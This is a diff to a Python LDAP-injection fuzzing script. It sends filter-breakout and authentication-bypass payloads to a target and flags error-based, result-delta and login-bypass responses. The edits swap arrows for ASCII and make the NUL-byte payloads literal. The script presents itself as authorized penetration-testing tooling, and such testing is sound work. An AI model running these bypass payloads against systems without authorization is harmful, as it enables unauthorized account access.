@@ -2,8 +2,8 @@
 """
 ldap_fuzz.py — authorized LDAP-injection prober. Tests a single injection point (mark it FUZZ, or it appends
 to a param / replaces FUZZ in --data) for:
-  - ERROR-BASED   (an LDAP error string appears → input reached the raw filter)
-  - RESULT-DELTA  (a wildcard * returns a noticeably larger/different response than a specific value → widened filter)
+  - ERROR-BASED   (an LDAP error string appears -> input reached the raw filter)
+  - RESULT-DELTA  (a wildcard * returns a noticeably larger/different response than a specific value -> widened filter)
   - AUTH-ORACLE   (with --true, an auth-bypass payload flips the response to the "success" marker)
 and reports the likely AND/OR context.
 
@@ -34,14 +34,16 @@ ERR_RE = re.compile("|".join(ERR_SIGS), re.I)
 
 # special-char + breakout probes (benign — only ALTER matching, never destroy) §5/§6
 SPECIAL = ["*", "(", ")", "&", "|", "!", "\\", "=", "*)(uid=*", "*)(objectClass=*",
-           "*))(|(objectClass=*", "x)(uid=*)", "%00"]
+           "*))(|(objectClass=*", "x)(uid=*)", "\x00"]
 # auth-bypass payloads (try as the injected field) §9
+# NOTE: NUL is a literal 0x00 byte (up.quote -> %00 on the wire). Writing "%00" here would be
+# double-encoded to %2500 and never truncate anything — the byte must be real (§14).
 AUTHBYP = ["*", "*)(uid=*))(|(uid=*", "*)(|(objectClass=*)", "admin)(&)",
-           "admin)(|(uid=*", "*))%00"]
+           "admin)(|(uid=*", "*))\x00"]
 
 
 def build_req(url, data, inject_field, payload):
-    """Return (method, url, data) with `payload` placed at the FUZZ marker / chosen field."""
+    """Return (url, data) with `payload` placed at the FUZZ marker / chosen field."""
     enc = up.quote(payload, safe="")
     if data:
         if "FUZZ" in data:
@@ -83,7 +85,7 @@ def main():
     ap.add_argument("--data", help="POST body; mark injection with FUZZ or use --inject <field>")
     ap.add_argument("--inject", help="field name in --data to inject (if not using FUZZ)")
     ap.add_argument("--true", dest="truemark",
-                    help="success/'logged-in' marker string → enables AUTH-ORACLE auth-bypass test (§9)")
+                    help="success/'logged-in' marker string -> enables AUTH-ORACLE auth-bypass test (§9)")
     ap.add_argument("--baseline", default="alice", help="a normal value to baseline against (default: alice)")
     ap.add_argument("--timeout", type=float, default=20)
     a = ap.parse_args()
@@ -104,10 +106,10 @@ def main():
         delta = len(rw.text) - base_len
         print(f"[*] wildcard '*'      status={rw.status_code}  len={len(rw.text)}  (delta {delta:+d})")
         if abs(delta) > max(80, base_len * 0.15) or rw.status_code != rb.status_code:
-            print("   [RESULT-DELTA] '*' changed the response markedly → filter may have WIDENED. "
+            print("   [RESULT-DELTA] '*' changed the response markedly -> filter may have WIDENED. "
                   "Confirm it returns MORE/OTHER entries (§10).")
 
-    # special-char + breakout probes → error-based + context (§5/§6/§7)
+    # special-char + breakout probes -> error-based + context (§5/§6/§7)
     print("\n[*] SPECIAL-CHAR / BREAKOUT probes (error-based + context):")
     and_or = None
     for p in SPECIAL:
@@ -118,10 +120,10 @@ def main():
         tag = ""
         if ERR_RE.search(r.text):
             m = ERR_RE.search(r.text)
-            tag = f"  [ERROR-BASED] LDAP error ~{m.group(0)!r} → input reaches the raw filter (§7)"
+            tag = f"  [ERROR-BASED] LDAP error ~{m.group(0)!r} -> input reaches the raw filter (§7)"
         dl = len(r.text) - base_len
         if p == "*)(objectClass=*" and (abs(dl) > max(80, base_len * 0.15)):
-            and_or = "AND (breakout *)(objectClass=*) widened results → §6.1)"
+            and_or = "AND (breakout *)(objectClass=*) widened results -> §6.1)"
         print(f"   payload={p!r:24} status={r.status_code} len={len(r.text)} (delta {dl:+d}){tag}")
     if and_or:
         print(f"   -> likely context: {and_or}")
@@ -135,9 +137,9 @@ def main():
             if r is None:
                 continue
             hit = a.truemark in r.text or r.status_code in (301, 302, 303)
-            flag = "  [AUTH BYPASS?] success marker / redirect → CONFIRM login by hand (§9) ⭐" if hit else ""
+            flag = "  [AUTH BYPASS?] success marker / redirect -> CONFIRM login by hand (§9) <===" if hit else ""
             print(f"   payload={p!r:24} status={r.status_code} len={len(r.text)}{flag}")
-        print("   -> a confirmed login WITHOUT valid creds = auth bypass. Note WHICH account you land on (admin→Critical).")
+        print("   -> a confirmed login WITHOUT valid creds = auth bypass. Note WHICH account you land on (admin->Critical).")
 
     print("\n[!] Reproduce any hit by hand: prove ALTERED LOGIC (more rows / flipped auth / a stable true-false oracle), "
           "not a reflected char. Use your own test account; bounded reads only; clean up (§20).")
